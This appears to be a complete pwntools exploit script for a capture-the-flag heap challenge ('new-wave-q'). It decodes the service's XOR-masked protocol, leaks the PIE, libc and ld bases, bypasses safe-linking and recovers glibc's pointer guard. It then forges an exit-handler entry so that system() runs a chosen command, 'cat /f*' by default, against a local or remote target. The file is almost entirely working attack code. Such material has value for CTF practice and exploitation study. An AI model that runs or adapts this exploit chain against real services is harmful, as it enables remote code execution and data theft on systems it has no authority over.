#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import struct
import time
from dataclasses import dataclass

from pwn import PIPE, context, process, remote


MSG_INFO = 1
MSG_END = 2
MSG_ERR = 3

CMD_CREATE = 4
CMD_EXIT = 5
CMD_FREE = 6
CMD_READ = 7
CMD_WRITE = 8
CMD_SETUP_TS = 9

LIBC_NOTE_TARGET = 0x211010
LIBC_LD_RW_PTR = 0x2126B8
LIBC_EXIT_HEAD = 0x211680
LIBC_EXIT_MANGLED = 0x212FF8
LIBC_EXIT_NODE = 0x212FE0
LIBC_COMMAND_BUF = 0x211D00
UNSORTED_LEAK_SIZE = 0x800
UNSORTED_CHANGED_OFFSET = 0x212010
LIBC_STACK_PTR_1 = 0x212370
LIBC_STACK_PTR_2 = 0x212378
LIBC_STACK_PTR_3 = 0x2126E0
LIBC_TEMPLATE_END = 0x213020
LD_RW_OFFSET = 0x3C000
LD_DL_FINI = 0x3480
LIBC_SYSTEM = 0x3A480
EXIT_FLAVOR_CXA = 4
PROGRESS = False
PROGRESS_START = 0.0
TEMPLATE_CACHE: dict[tuple[int, str | None, str | None, str | None], tuple[int, int, int, int, int, int, int, bytes]] = {}
LOCAL_BIN: str | None = None
LOCAL_LD: str | None = None
LOCAL_LIBC_DIR: str | None = None


@dataclass
class InfoMsg:
    msg_id: int
    data: bytes


class Proto:
    def __init__(self, tube):
        self.tube = tube
        self.counter = 0

    def _xform(self, data: bytes) -> bytes:
        out = bytes(b ^ ((self.counter + i) & 0xFF) for i, b in enumerate(data))
        self.counter = (self.counter + len(data)) & 0xFF
        return out

    def send(self, data: bytes) -> None:
        self.tube.send(self._xform(data))

    def recvn(self, n: int) -> bytes:
        return self._xform(self.tube.recvn(n))

    def recv_msg(self):
        msg_type = struct.unpack("<I", self.recvn(4))[0]
        if msg_type == MSG_INFO:
            msg_id, length = struct.unpack("<II", self.recvn(8))
            return InfoMsg(msg_id, self.recvn(length))
        if msg_type == MSG_END:
            return "end"
        if msg_type == MSG_ERR:
            return ("err", struct.unpack("<Q", self.recvn(8))[0])
        raise ValueError(f"unknown message type: {msg_type:#x}")

    def recv_until_err(self):
        out = []
        while True:
            msg = self.recv_msg()
            out.append(msg)
            if isinstance(msg, tuple) and msg[0] == "err":
                return out

    def command(self, op: int, payload: bytes = b""):
        self.send(struct.pack("<I", op) + payload)
        return self.recv_until_err()


def q(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def progress(msg: str) -> None:
    if PROGRESS:
        print(f"[{time.time() - PROGRESS_START:7.3f}] {msg}", flush=True)


def get_local_bases(pid: int) -> tuple[int, int]:
    libc_base = 0
    ld_base = 0
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as fh:
        for line in fh:
            if "/libc." in line and "r-xp" in line:
                libc_base = int(line.split("-", 1)[0], 16) - int(line.split()[2], 16)
            elif "/ld-linux" in line and "r-xp" in line:
                ld_base = int(line.split("-", 1)[0], 16) - int(line.split()[2], 16)
    if libc_base == 0 or ld_base == 0:
        raise RuntimeError("failed to resolve local libc/ld bases")
    return libc_base, ld_base


def get_local_layout(pid: int) -> tuple[int, int, int, int]:
    heap_lo = 0
    heap_hi = 0
    stack_lo = 0
    stack_hi = 0
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as fh:
        for line in fh:
            if "[heap]" in line:
                heap_lo, heap_hi = (
                    int(part, 16) for part in line.split()[0].split("-", 1)
                )
            elif "[stack]" in line:
                stack_lo, stack_hi = (
                    int(part, 16) for part in line.split()[0].split("-", 1)
                )
    if heap_lo == 0 or heap_hi == 0 or stack_lo == 0 or stack_hi == 0:
        raise RuntimeError("failed to resolve local heap/stack layout")
    return heap_lo, heap_hi, stack_lo, stack_hi


def rol64(x: int, r: int) -> int:
    return ((x << r) | (x >> (64 - r))) & 0xFFFFFFFFFFFFFFFF


def ror64(x: int, r: int) -> int:
    return ((x >> r) | (x << (64 - r))) & 0xFFFFFFFFFFFFFFFF


def start_local(aslr: bool = True):
    binary = LOCAL_BIN or "./new-wave-q"
    argv = [binary]
    env = None
    if LOCAL_LD is not None:
        argv = [LOCAL_LD]
        if LOCAL_LIBC_DIR is not None:
            argv.extend(["--library-path", LOCAL_LIBC_DIR])
        argv.append(binary)
    elif LOCAL_LIBC_DIR is not None:
        env = dict(os.environ)
        env["LD_LIBRARY_PATH"] = LOCAL_LIBC_DIR
    return Proto(
        process(argv, stdin=PIPE, stdout=PIPE, stderr=PIPE, env=env, aslr=aslr)
    )


def start_remote(host: str, port: int):
    return Proto(remote(host, port))


def read_greeting(proto: Proto):
    return proto.recv_msg(), proto.recv_msg()


def cmd_create(proto: Proto, size: int):
    return proto.command(CMD_CREATE, struct.pack("<I", size & 0xFFFFFFFF))


def cmd_free(proto: Proto):
    return proto.command(CMD_FREE)


def cmd_read(proto: Proto, data: bytes):
    return proto.command(CMD_READ, struct.pack("<I", len(data)) + data)


def cmd_write(proto: Proto):
    return proto.command(CMD_WRITE)


def cmd_setup_ts(proto: Proto):
    return proto.command(CMD_SETUP_TS)


def extract_numbers(msgs) -> list[int]:
    out = []
    for msg in msgs:
        if isinstance(msg, InfoMsg):
            out.extend(int(x) for x in re.findall(rb"\d+", msg.data))
    return out


def extract_info_blobs(msgs) -> list[bytes]:
    return [msg.data for msg in msgs if isinstance(msg, InfoMsg)]


def extract_note_blob(msgs) -> bytes:
    blobs = extract_info_blobs(msgs)
    return blobs[0] if blobs else b""


def leak_pie(proto: Proto) -> int:
    cmd_create(proto, 0xFFFFFFFF)
    cmd_setup_ts(proto)
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)
    cmd_setup_ts(proto)
    msgs = cmd_write(proto)
    leaked_last_error = extract_numbers(msgs)[-1]
    return leaked_last_error - 0x4058


def prepare_mask_state(proto: Proto) -> None:
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)


def leak_mask(proto: Proto) -> int:
    cmd_read(proto, b"BBBBBBBB")
    msgs = cmd_write(proto)
    blob = b"".join(msg.data for msg in msgs if isinstance(msg, InfoMsg))
    marker = blob.index(b"BBBBBBBB")
    raw = blob[marker + 8 :].split(b"\n", 1)[0]
    mask = int.from_bytes(raw, "little")
    cmd_read(proto, struct.pack("<Q", 0x21))
    return mask


def retarget(proto: Proto, target: int, mask: int) -> None:
    payload = q(0x21) + q(target ^ mask) + q(0)
    cmd_read(proto, payload)
    cmd_setup_ts(proto)
    cmd_setup_ts(proto)


def parse_timestamps(msgs) -> dict[str, int]:
    out: dict[str, int] = {}
    current = None
    for msg in msgs:
        if not isinstance(msg, InfoMsg):
            continue
        text = msg.data.decode("latin-1", "ignore")
        if text in {"Created", "Changed", "Accessed"}:
            current = text
            continue
        match = re.search(r"(\d+)", text)
        if current is not None and match is not None:
            out[current] = int(match.group(1))
            current = None
    return out


def leak_libc_with_stdout(proto: Proto, pie: int, mask: int) -> tuple[int, dict[str, int]]:
    retarget(proto, pie + 0x4020, mask)
    timestamps = parse_timestamps(cmd_write(proto))
    libc_base = timestamps["Accessed"] - 0x2158E0
    return libc_base, timestamps


def leak_libc_unsorted(proto: Proto, size: int = UNSORTED_LEAK_SIZE) -> tuple[int, dict[str, int]]:
    cmd_create(proto, size)
    cmd_setup_ts(proto)
    cmd_setup_ts(proto)
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)
    cmd_setup_ts(proto)
    timestamps = parse_timestamps(cmd_write(proto))
    libc_base = timestamps["Changed"] - UNSORTED_CHANGED_OFFSET
    return libc_base, timestamps


def move_note_to_target(proto: Proto, mask: int, target: int) -> None:
    payload = q(0x21) + q(target ^ mask) + q(0)
    cmd_read(proto, payload)
    cmd_setup_ts(proto)
    cmd_setup_ts(proto)
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)


def progressive_leak(proto: Proto, note_base: int, target: int, length: int) -> bytes:
    if target < note_base + 0x18:
        raise ValueError("target is before note data")

    start = note_base + 0x18
    prefix = target - start
    out = bytearray(b"\x00" * length)
    known = [False] * length
    i = -1
    marker = 0x41

    while i < length - 1:
        fill_len = prefix + i + 1
        if fill_len > 0:
            cmd_read(proto, bytes([marker]) * fill_len)
        blob = extract_note_blob(cmd_write(proto))
        if len(blob) < prefix:
            raise RuntimeError("short note blob during progressive leak")
        start_idx = max(i + 1, 0)
        pos = prefix + start_idx
        while pos < len(blob) and start_idx < length:
            out[start_idx] = blob[pos]
            known[start_idx] = True
            pos += 1
            start_idx += 1
        if start_idx >= length:
            break
        if pos != len(blob):
            raise RuntimeError("unexpected extra data while leaking")
        i = start_idx
        if i < length:
            out[i] = 0
            known[i] = True
        if PROGRESS and length >= 0x100 and (i + 1) % 0x100 == 0:
            progress(f"leak {target:#x} +{i + 1:#x}/{length:#x}")
        marker = 0x41 + ((marker - 0x40) % 26)

    if not all(known):
        raise RuntimeError(f"incomplete leak at {target:#x}: {known}")
    return bytes(out)


def leak_qword(proto: Proto, note_base: int, addr: int) -> int:
    raw = progressive_leak(proto, note_base, addr, 8)
    return struct.unpack("<Q", raw)[0]


def put_bytes(buf: bytearray, start: int, addr: int, data: bytes) -> None:
    off = addr - start
    if off < 0 or off + len(data) > len(buf):
        raise ValueError(f"write out of range: {addr:#x}")
    buf[off : off + len(data)] = data


def read_qword_from_blob(blob: bytes, start: int, addr: int) -> int:
    off = addr - start
    return struct.unpack("<Q", blob[off : off + 8])[0]


def leak_live_slice(proto: Proto, length: int) -> bytes:
    known = bytearray()
    marker = 0x41

    while len(known) < length:
        if known:
            payload = bytes(b if b != 0 else marker for b in known)
            cmd_read(proto, payload)
        blob = extract_note_blob(cmd_write(proto))
        if len(blob) < len(known):
            raise RuntimeError("short note blob during live leak")
        leaked = blob[len(known) :]
        if leaked:
            take = min(length - len(known), len(leaked))
            known.extend(leaked[:take])
            if len(known) >= length:
                break
            if take == len(leaked):
                known.append(0)
        else:
            known.append(0)
        marker = 0x41 + ((marker - 0x40) % 26)
        if PROGRESS and length >= 0x100 and len(known) % 0x100 == 0:
            progress(f"live leak {len(known):#x}/{length:#x}")

    return bytes(known)


def build_local_write_template(
    command: bytes,
) -> tuple[int, int, int, int, int, int, int, bytes]:
    cache_key = (len(command), LOCAL_BIN, LOCAL_LD, LOCAL_LIBC_DIR)
    cached = TEMPLATE_CACHE.get(cache_key)
    if cached is not None:
        return cached

    proto = start_local(aslr=False)
    pid = proto.tube.proc.pid
    try:
        read_greeting(proto)
        libc_base, timestamps = leak_libc_unsorted(proto)
        rebuild_mask_state_after_unsorted(proto)
        mask = leak_mask(proto)
        move_note_to_target(proto, mask, libc_base + LIBC_NOTE_TARGET)
        _, ld_base = get_local_bases(pid)
        heap_lo, heap_hi, stack_lo, stack_hi = get_local_layout(pid)
        heap_page = timestamps["Accessed"]
        start = libc_base + LIBC_NOTE_TARGET + 0x18
        end = libc_base + LIBC_TEMPLATE_END
        with open(f"/proc/{pid}/mem", "rb", buffering=0) as fh:
            fh.seek(start)
            data = fh.read(end - start)
        result = (
            libc_base,
            ld_base,
            heap_page,
            heap_lo,
            heap_hi,
            stack_lo,
            stack_hi,
            data,
        )
        TEMPLATE_CACHE[cache_key] = result
        return result
    finally:
        proto.tube.close()


def rebase_write_template(
    template: bytes,
    ref_libc: int,
    ref_ld: int,
    ref_heap: int,
    ref_heap_lo: int,
    ref_heap_hi: int,
    ref_stack_lo: int,
    ref_stack_hi: int,
    remote_libc: int,
    remote_ld: int,
    remote_heap: int,
    remote_stack_ptr_3: int,
) -> bytes:
    out = bytearray(template)
    qword_len = (len(out) // 8) * 8
    ref_start = ref_libc + LIBC_NOTE_TARGET + 0x18
    ref_stack_ptr_3 = read_qword_from_blob(template, ref_start, ref_libc + LIBC_STACK_PTR_3)
    heap_delta = remote_heap - ref_heap
    stack_delta = remote_stack_ptr_3 - ref_stack_ptr_3
    for off in range(0, qword_len, 8):
        value = struct.unpack("<Q", out[off : off + 8])[0]
        if ref_libc <= value < ref_libc + 0x400000:
            value = remote_libc + (value - ref_libc)
        elif ref_ld <= value < ref_ld + 0x50000:
            value = remote_ld + (value - ref_ld)
        elif ref_heap_lo <= value < ref_heap_hi:
            value += heap_delta
        elif ref_stack_lo <= value < ref_stack_hi:
            value += stack_delta
        out[off : off + 8] = struct.pack("<Q", value)
    return bytes(out)


def forge_existing_exit_node(
    orig: bytes,
    start: int,
    head: int,
    libc_base: int,
    system_addr: int,
    pointer_guard: int,
    command: bytes,
) -> bytes:
    mangled_system = rol64(system_addr ^ pointer_guard, 0x11)
    command_addr = libc_base + LIBC_COMMAND_BUF
    buf = bytearray(orig)
    put_bytes(buf, start, head + 0x18, q(mangled_system))
    put_bytes(buf, start, head + 0x20, q(command_addr))
    put_bytes(buf, start, command_addr, command + b"\x00")
    return bytes(buf)


def rebuild_mask_state_after_unsorted(proto: Proto) -> None:
    # Burn the stale tcache entry from the earlier small note, then recreate
    # the original "note above timestamp" geometry and finally the standard
    # mask-leak state with a freed adjacent 0x20 chunk above the note.
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)
    cmd_setup_ts(proto)
    cmd_setup_ts(proto)
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)
    cmd_setup_ts(proto)
    cmd_free(proto)
    cmd_create(proto, 0xFFFFFFFF)


def exploit(proto: Proto, command: bytes) -> dict[str, int | bytes]:
    read_greeting(proto)
    progress("greeting")
    libc_base, leak_timestamps = leak_libc_unsorted(proto)
    progress(f"libc leak {libc_base:#x}")
    rebuild_mask_state_after_unsorted(proto)
    progress("mask state rebuilt")
    mask = leak_mask(proto)
    progress(f"mask {mask:#x}")
    move_note_to_target(proto, mask, libc_base + LIBC_NOTE_TARGET)
    progress("note moved to libc")
    note_base = libc_base + LIBC_NOTE_TARGET
    (
        ref_libc,
        ref_ld,
        ref_heap,
        ref_heap_lo,
        ref_heap_hi,
        ref_stack_lo,
        ref_stack_hi,
        template,
    ) = build_local_write_template(command)
    progress("local template ready")
    start = libc_base + LIBC_NOTE_TARGET + 0x18
    head = leak_qword(proto, note_base, libc_base + LIBC_EXIT_HEAD)
    stack_ptr_1 = leak_qword(proto, note_base, libc_base + LIBC_STACK_PTR_1)
    stack_ptr_2 = leak_qword(proto, note_base, libc_base + LIBC_STACK_PTR_2)
    ld_rw = leak_qword(proto, note_base, libc_base + LIBC_LD_RW_PTR)
    stack_ptr_3 = leak_qword(proto, note_base, libc_base + LIBC_STACK_PTR_3)
    ld_base = ld_rw - LD_RW_OFFSET
    mangled_fini = leak_qword(proto, note_base, libc_base + LIBC_EXIT_MANGLED)
    pointer_guard = ror64(mangled_fini, 0x11) ^ (ld_base + LD_DL_FINI)
    system_addr = libc_base + LIBC_SYSTEM
    orig = bytearray(
        rebase_write_template(
            template,
            ref_libc,
            ref_ld,
            ref_heap,
            ref_heap_lo,
            ref_heap_hi,
            ref_stack_lo,
            ref_stack_hi,
            libc_base,
            ld_base,
            leak_timestamps["Accessed"],
            stack_ptr_3,
        )
    )
    put_bytes(orig, start, libc_base + LIBC_EXIT_HEAD, q(head))
    put_bytes(orig, start, libc_base + LIBC_STACK_PTR_1, q(stack_ptr_1))
    put_bytes(orig, start, libc_base + LIBC_STACK_PTR_2, q(stack_ptr_2))
    put_bytes(orig, start, libc_base + LIBC_LD_RW_PTR, q(ld_rw))
    put_bytes(orig, start, libc_base + LIBC_STACK_PTR_3, q(stack_ptr_3))
    put_bytes(orig, start, libc_base + LIBC_EXIT_MANGLED, q(mangled_fini))
    progress(f"template rebased ({len(orig)} bytes)")
    patched = forge_existing_exit_node(
        bytes(orig),
        start,
        head,
        libc_base,
        system_addr,
        pointer_guard,
        command,
    )
    cmd_read(proto, patched)
    progress("patched slab written")
    proto.send(struct.pack("<I", CMD_EXIT))
    progress("exit opcode sent")
    final = proto.recv_msg()
    if not (isinstance(final, tuple) and final[0] == "err"):
        raise RuntimeError(f"unexpected final message: {final!r}")
    progress(f"final err {final[1]}")
    raw = proto.tube.recvall(timeout=2)
    progress(f"raw bytes {len(raw)}")

    return {
        "mask": mask,
        "libc": libc_base,
        "ld": ld_base,
        "head": head,
        "ld_rw": ld_rw,
        "pointer_guard": pointer_guard,
        "mangled_fini": mangled_fini,
        "leak_timestamps": leak_timestamps,
        "final_error": final[1],
        "raw": raw,
    }


def do_leak(host: str | None, port: int | None):
    proto = start_remote(host, port) if host else start_local()
    read_greeting(proto)
    pie = leak_pie(proto)
    prepare_mask_state(proto)
    mask = leak_mask(proto)
    libc_base, timestamps = leak_libc_with_stdout(proto, pie, mask)
    print(f"pie={pie:#x}")
    print(f"mask={mask:#x}")
    print(f"libc={libc_base:#x}")
    print(f"timestamps={timestamps}")
    proto.tube.close()


def do_exploit(host: str | None, port: int | None, command: bytes, aslr: bool):
    proto = start_remote(host, port) if host else start_local(aslr=aslr)
    result = exploit(proto, command)
    print(f"mask={result['mask']:#x}")
    print(f"libc={result['libc']:#x}")
    print(f"ld={result['ld']:#x}")
    print(f"head={result['head']:#x}")
    print(f"ld_rw={result['ld_rw']:#x}")
    print(f"pointer_guard={result['pointer_guard']:#x}")
    print(f"mangled_fini={result['mangled_fini']:#x}")
    print(f"final_error={result['final_error']}")
    raw = result["raw"]
    print(raw.decode("latin-1", "replace"))


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "mode",
        nargs="?",
        default="leak",
        choices=["leak", "exploit"],
    )
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument(
        "--cmd",
        default="cat /f*",
    )
    parser.add_argument("--bin")
    parser.add_argument("--ld")
    parser.add_argument("--libc-dir")
    parser.add_argument("--no-aslr", action="store_true")
    parser.add_argument("--progress", action="store_true")
    return parser.parse_args()


def main():
    global LOCAL_BIN, LOCAL_LD, LOCAL_LIBC_DIR, PROGRESS, PROGRESS_START
    context.log_level = "error"
    context.arch = "amd64"
    args = parse_args()
    LOCAL_BIN = args.bin
    LOCAL_LD = args.ld
    LOCAL_LIBC_DIR = args.libc_dir
    PROGRESS = args.progress
    PROGRESS_START = time.time()
    if args.mode == "leak":
        do_leak(args.host, args.port)
    else:
        do_exploit(args.host, args.port, args.cmd.encode(), aslr=not args.no_aslr)


if __name__ == "__main__":
    main()
